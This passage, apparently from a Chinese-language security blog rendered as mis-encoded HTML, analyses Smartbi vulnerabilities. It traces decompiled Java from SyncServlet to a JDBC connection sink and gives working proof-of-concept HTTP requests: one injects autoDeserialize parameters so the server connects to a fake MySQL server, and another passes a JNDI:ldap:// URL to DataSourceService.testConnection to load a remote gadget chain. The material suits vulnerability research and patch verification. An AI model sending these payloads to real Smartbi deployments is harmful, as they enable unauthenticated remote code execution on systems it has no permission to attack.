class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702241.png" alt="20250806162931145"></p><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><ol><li>æ ¹æ®ä¾èµ–ç‰ˆæœ¬ç¡®å®šå­˜åœ¨æ¼æ´</li><li>æ ¹æ®ä¾èµ–çš„æ•æ„Ÿå‡½æ•°æ‰¾å…¥å£ç‚¹</li></ol><h2 id="å‰å°JDBCååºåˆ—åŒ–"><a href="#å‰å°JDBCååºåˆ—åŒ–" class="headerlink" title="å‰å°JDBCååºåˆ—åŒ–"></a>å‰å°JDBCååºåˆ—åŒ–</h2><h3 id="æ¼æ´åˆ†æï¼š-1"><a href="#æ¼æ´åˆ†æï¼š-1" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>        <span class="hljs-type">File</span> <span class="hljs-variable">tmpFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">actionType</span> <span class="hljs-operator">=</span> StringUtil.getLanguageValue(<span class="hljs-string">&quot;Synchronization&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>                request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>                response.setBufferSize(<span class="hljs-number">4096</span>);<br>                <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>                    <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>                    <span class="hljs-comment">//ä»è¯·æ±‚ä¸­æå–æ•°æ®åº“è¿æ¥é…ç½®å’ŒæŸ¥è¯¢è¯­å¥</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                    log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>                    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› synchronize</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncResources</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//è°ƒç”¨ DbUtil.getConnection() è·å–æ•°æ®åº“è¿æ¥</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>            <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>            <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>è·Ÿè¿› DbUtil.getConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DbUtil</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//å°†ä¼ å…¥çš„ dbType å­—ç¬¦ä¸²è½¬ä¸ºå¤§å†™å¹¶åœ¨ DBType ä¸­æŸ¥æ‰¾ï¼›å¦‚æœè¾“å…¥éæ³•ï¼ŒæŠ›å‡ºå¼‚å¸¸å¹¶è¿”å› null</span><br>            driverType = DBType.valueOf(dbType.toUpperCase());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//translateDriverInfo() æ–¹æ³•ï¼šæ ¹æ®æ•°æ®åº“ç±»å‹ã€æœåŠ¡å™¨åœ°å€ã€æ•°æ®åº“å,ç”Ÿæˆæ•°æ®åº“è¿æ¥é…ç½®ï¼Œå¦‚ï¼š&quot;jdbc:db2://&quot; + serverName + &quot;/&quot; + dbName</span><br>        String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>        <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//åˆ›å»º DefaultConnectionInfo å®ä¾‹ï¼Œç”¨äºè¡¨ç¤ºè¿æ¥ä¿¡æ¯</span><br>            <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>            info.setId(UUIDGenerator.generate());<br>            info.setName(connName);<br>            info.setDriverType(driverType);<br>            info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>            info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>            info.setUser(dbUser);<br>            info.setPassword(dbPass);<br>            <span class="hljs-comment">//è·å–æ•°æ®åº“è¿æ¥</span><br>            <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>        String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">switch</span> (dbType) &#123;<br>            <span class="hljs-keyword">case</span> DB2:<br>            <span class="hljs-keyword">case</span> DB2_400:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> DB2_V9:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> INFORMIX:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.informix.jdbc.IfxDriver&quot;</span>;<br>                result[<span class="hljs-number">1</span>] = serverName;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-keyword">case</span> INFOBRIGHT:<br>                result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>                <span class="hljs-keyword">if</span> (dbEncoding == <span class="hljs-literal">null</span>) &#123;<br>                    dbEncoding = <span class="hljs-string">&quot;GBK&quot;</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;mysqlCluster=true&quot;</span>.equals(dbType.getProp())) &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql:loadbalance://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;autoReconnect=true&amp;roundRobinLoadBalance=true&amp;failOverReadOnly=false&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:mysql://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>                    <span class="hljs-keyword">if</span> (dbName.indexOf(<span class="hljs-string">&quot;?&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                        result[<span class="hljs-number">1</span>] = result[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;?useServerPrepStmts=true&amp;useOldAliasMetadataBehavior=true&amp;useUnicode=true&amp;characterEncoding=&quot;</span> + dbEncoding;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MSSQL:<br>                ......<br></code></pre></td></tr></table></figure><p>æ¼æ´ç‚¹äº§ç”Ÿåœ¨ <code>translateDriverInfo</code> ï¼Œæ­¤å¤„å¯ä»¥æ‹¼æ¥æ¶æ„æ•°æ®åº“</p><h3 id="æ¼æ´å¤ç°ï¼š-1"><a href="#æ¼æ´å¤ç°ï¼š-1" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h3><p>æ„é€ POCï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbNameO<span class="hljs-attr">nly</span><span class="hljs-operator">=</span>false<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>MYSQL<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>[æœ¬æœºIP]:<span class="hljs-number">3308</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>d5a442d?detectCustomC<span class="hljs-attr">ollations</span><span class="hljs-operator">=</span>true<span class="hljs-variable">&amp;</span>autoD<span class="hljs-attr">eserialize</span><span class="hljs-operator">=</span>yes<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/SyncServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">138</span><br><br><span class="hljs-attribute">type</span>=sqldictsync&amp;dbNameOnly=false&amp;dbType=MYSQL&amp;dbServer=[æœ¬æœºIP]:<span class="hljs-number">3308</span>&amp;dbName=d5a442d?detectCustomCollations=true%<span class="hljs-number">26</span>autoDeserialize=yes<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œå¼€å¯3308ç«¯å£ï¼Œæ­å»ºFakeMysqlæœåŠ¡å™¨ï¼Œç”ŸæˆK1é“¾</p><p>æˆåŠŸåˆ©ç”¨ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702529.png" alt="20250806181941863"></p><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><h3 id="æ¼æ´åˆ†æï¼š-2"><a href="#æ¼æ´åˆ†æï¼š-2" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702526.png" alt="20250806192734078"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//å¦‚æœæ•°æ®åº“è¿æ¥urlæ˜¯ä»¥JDNIå¼€å¤´</span><br><span class="hljs-keyword">if</span> (info.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>    <span class="hljs-comment">//å»æ‰ JNDI éƒ¨åˆ†ï¼Œä¿ç•™åè¾¹éƒ¨åˆ†ï¼Œç„¶åç”¨ cxt.lookup æŸ¥æ‰¾å¹¶è¿”å› DataSource</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(info.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>    <span class="hljs-keyword">return</span> dataSource.getConnection();<br></code></pre></td></tr></table></figure><h3 id="æ¼æ´å¤ç°ï¼š-2"><a href="#æ¼æ´å¤ç°ï¼š-2" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h3><p>POCï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">18080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5672</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/index.jsp<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">5</span>E67682266D39E9F1475ADA74B62E102<br><span class="hljs-attribute">Connection</span> : keep-alive<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">466</span><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://[ip]:15089/bb4e07&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br><span class="hljs-attribute">className</span>=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>%<span class="hljs-number">3</span>a100,<span class="hljs-string">&quot;user&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JNDI:ldap://9sjhyp.dnslog.cn&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>%<span class="hljs-number">3</span>a-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>%<span class="hljs-number">3</span>a0,<span class="hljs-string">&quot;dbToCharset&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703762.png" alt="20250806192146688"></p><p>ç”ŸæˆK1é“¾ï¼š</p><p>ldap:&#x2F;&#x2F;[ip]:15089&#x2F;bb4e07</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703873.png" alt="20250806192251404"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703089.png" alt="20250806191933929"></p><p>è¿™é‡Œå› ä¸ºç«¯å£çš„é—®é¢˜æ²¡æœ‰åˆ©ç”¨æˆåŠŸã€‚æŠ¥é”™LDAPæœåŠ¡å™¨æœªå“åº”</p><p>Windows ç³»ç»Ÿ<strong>å°† 50389 ç«¯å£ä½œä¸ºæ’é™¤èŒƒå›´</strong>ï¼Œä¸å…è®¸ç¨‹åºï¼ˆåŒ…æ‹¬ Dockerï¼‰ç»‘å®šä½¿ç”¨å®ƒã€‚å®‰è£…JavaChains æ—¶å°† <code>  -p 50389:50389 ^</code>æ”¹æˆäº†  <code>-p 15089:50389 ^</code>ï¼Œå¯èƒ½ç›‘å¬ä¸åˆ°ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703075.png" alt="20250806190250099"></p><p>ä½¿ç”¨dnslog</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 